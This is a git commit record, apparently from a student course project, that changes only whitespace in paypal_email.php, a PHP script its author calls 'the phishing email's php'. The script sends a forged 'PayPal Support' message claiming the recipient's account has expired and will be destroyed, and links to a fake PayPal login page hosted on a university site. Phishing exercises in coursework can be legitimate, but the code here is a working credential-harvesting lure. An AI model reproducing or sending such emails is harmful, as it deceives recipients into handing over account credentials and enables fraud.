a25b14dde4d71c7e29c30d2b1121caa1d2d7c08b
xepherPrime <xepherPrime@gmail.com>
2015-12-03 08:59:39 -0500

    final
    Ok, last time I practice editing files.
    Basically, this is the phishing email's php.  Mailinator kicks me out now since I apparently reached the limit.   If you want to test it in njit email, then you''ll need to take out the headers. (^^)

--- paypal_email.php
+++ paypal_email.php
@@ -8,17 +8,15 @@ $txt = "Dear Customer, \n
 		Please be aware that your account expired.  It is indispensible to perform an audit of your data
 		is present, otherwise your account will be destroyed.  Just click the link below. \n
 		<a href=\"https://web.njit.edu/~al322/332/paypallogin.html\">Click here</a> \n\n";
-
 $txt .= "We requests verification whenever an email address is selected as an account.  Your account cannot be used
 		until you verify it.\n\n
 		Sincerely, \n
 		PayPal Support \n\n
 		Please do not reply to this message.";
-
 if(isset($_GET["email"]))
 {
 	echo "$to<br>";
-    echo "$txt";
-    mail($to,$subject,$txt,$headers);
+    	echo "$txt";
+    	mail($to,$subject,$txt,$headers);
 }
 ?>
